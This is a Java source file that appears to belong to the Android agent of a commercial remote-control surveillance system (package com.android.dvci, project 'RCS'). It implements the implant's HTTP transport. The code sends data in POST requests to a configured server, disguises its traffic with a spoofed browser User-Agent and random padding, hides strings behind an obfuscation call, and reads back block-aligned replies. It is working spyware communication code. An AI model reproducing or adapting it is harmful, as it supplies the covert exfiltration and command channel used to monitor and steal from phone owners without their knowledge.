/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : HttpKeepAliveTransport.java
 * Created      : 6-mag-2011
 * Author		: zeno
 * *******************************************/

package com.android.dvci.action.sync;

import java.io.DataInputStream;
import java.io.IOException;

import org.apache.http.HttpResponse;
import org.apache.http.HttpStatus;
import org.apache.http.HttpVersion;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.conn.scheme.PlainSocketFactory;
import org.apache.http.conn.scheme.Scheme;
import org.apache.http.conn.scheme.SchemeRegistry;
import org.apache.http.cookie.Cookie;
import org.apache.http.entity.ByteArrayEntity;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.params.BasicHttpParams;
import org.apache.http.params.HttpConnectionParams;
import org.apache.http.params.HttpProtocolParams;

import com.android.dvci.auto.Cfg;
import com.android.dvci.util.Check;
import com.android.dvci.util.Utils;
import com.android.mm.M;

public abstract class HttpKeepAliveTransport extends HttpTransport {
	private static final String TAG = "HttpKeepAliveTransport"; //$NON-NLS-1$
	DefaultHttpClient httpclient;

	private Statistics statistics;

	public HttpKeepAliveTransport(String host) {
		super(host);

	}

	/**
	 * http://www.androidsnippets.com/executing-a-http-post-request-with-
	 * httpclient
	 * 
	 * @param data
	 *            the data
	 * @return the byte[]
	 * @throws TransportException
	 *             the transport exception
	 */
	@Override
	public synchronized byte[] command(byte[] data) throws TransportException {
		if (Cfg.STATISTICS) {
			statistics.addOut(data.length);
		}

		if (Cfg.DEBUG) {
			Check.ensures(httpclient != null, "call startSession before command"); //$NON-NLS-1$
			// httpclient.getParams().setParameter(ClientPNames.COOKIE_POLICY,
			// CookiePolicy.RFC_2965);
		}

		final HttpPost httppost = new HttpPost(baseurl);

		httppost.setHeader(M.e("User-Agent"), //$NON-NLS-1$
		M.e("Mozilla/5.0 (Linux; U; Android 3.0; en-us) AppleWebKit/533.1 (KHTML, like Gecko) Safari/533.1")); //$NON-NLS-1$
		httppost.setHeader(M.e("Content-Type"), M.e("application/octet-stream")); //$NON-NLS-1$ //$NON-NLS-2$

		if (cookies != null) {
			for (final Cookie cookie : cookies) {
				httpclient.getCookieStore().addCookie(cookie);
				// httppost.setHeader("Cookie", cookie.getName());
			}
		}

		DataInputStream in = null;
		Statistics stat = null;
		
		try {

			//RANDBLOCK
			byte[] randBlock = Utils.getRandomByteArray(1, 16);
			data = Utils.concat(data, randBlock);		

			httppost.setEntity(new ByteArrayEntity(data));

			if (Cfg.STATISTICS) {
				stat = new Statistics("httpclient", data.length);
			}
			
			final HttpResponse response = httpclient.execute(httppost);
			
			if (Cfg.STATISTICS) {
				stat.stop();
			}

			final int returnCode = response.getStatusLine().getStatusCode();

			if (returnCode == HttpStatus.SC_OK) {
				cookies = httpclient.getCookieStore().getCookies();

				long length = response.getEntity().getContentLength();
				
				if (length % 16 > 0) {
					/*
					 * if (Cfg.DEBUG) { Check.log(TAG +
					 * " (command), dropping some bytes: " + length % 16); }
					 */
					length = length - (length % 16);
				}
				

				in = new DataInputStream(response.getEntity().getContent());

				final byte[] content = new byte[(int) length];
				in.readFully(content);
				in.close();

				if (Cfg.STATISTICS) {
					statistics.addIn(content.length);
				}

				return content;
			} else {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (command) error: " + returnCode);
				}
				return null;
			}
		} catch (final Exception ex) {
			if (Cfg.EXCEPTION) {
				Check.log(ex);
			}

			if (Cfg.DEBUG) {
				Check.log(TAG + " Error: " + ex.toString());//$NON-NLS-1$
			}

			throw new TransportException(1);
		} finally {
			/*
			 * if (Cfg.STATISTICS && stat != null) { stat.stop(); }
			 */
			if (in != null) {
				try {
					in.close();
				} catch (final IOException e) {
					if (Cfg.EXCEPTION) {
						Check.log(e);
					}

					if (Cfg.DEBUG) {
						Check.log(e);//$NON-NLS-1$
					}
				}
			}
		}
		// byte[] content = parseHttpConnection(connection);
	}

	@Override
	public void start() {

		SchemeRegistry registry = new SchemeRegistry();
		registry.register(new Scheme("http", PlainSocketFactory.getSocketFactory(), 80));

		BasicHttpParams httpParameters = new BasicHttpParams();
		HttpProtocolParams.setVersion(httpParameters, HttpVersion.HTTP_1_1);
		
		// final HttpParams httpParameters = new BasicHttpParams();
		// Set the timeout in milliseconds until a connection is established.
		final int timeoutConnection = 120000;
		HttpConnectionParams.setConnectionTimeout(httpParameters, timeoutConnection);
		
		// Set the default socket timeout (SO_TIMEOUT)
		// in milliseconds which is the timeout for waiting for data.
		final int timeoutSocket = 120000;
		HttpConnectionParams.setSoTimeout(httpParameters, timeoutSocket);

		httpclient = new DefaultHttpClient(httpParameters);

		if (Cfg.STATISTICS) {
			statistics = new Statistics("HTTP");
			statistics.start(false);
		}
	}

	@Override
	public void close() {
		cookies = null;
		httpclient = null;

		if (Cfg.STATISTICS && statistics != null) {
			statistics.stop();
		}
	}
}
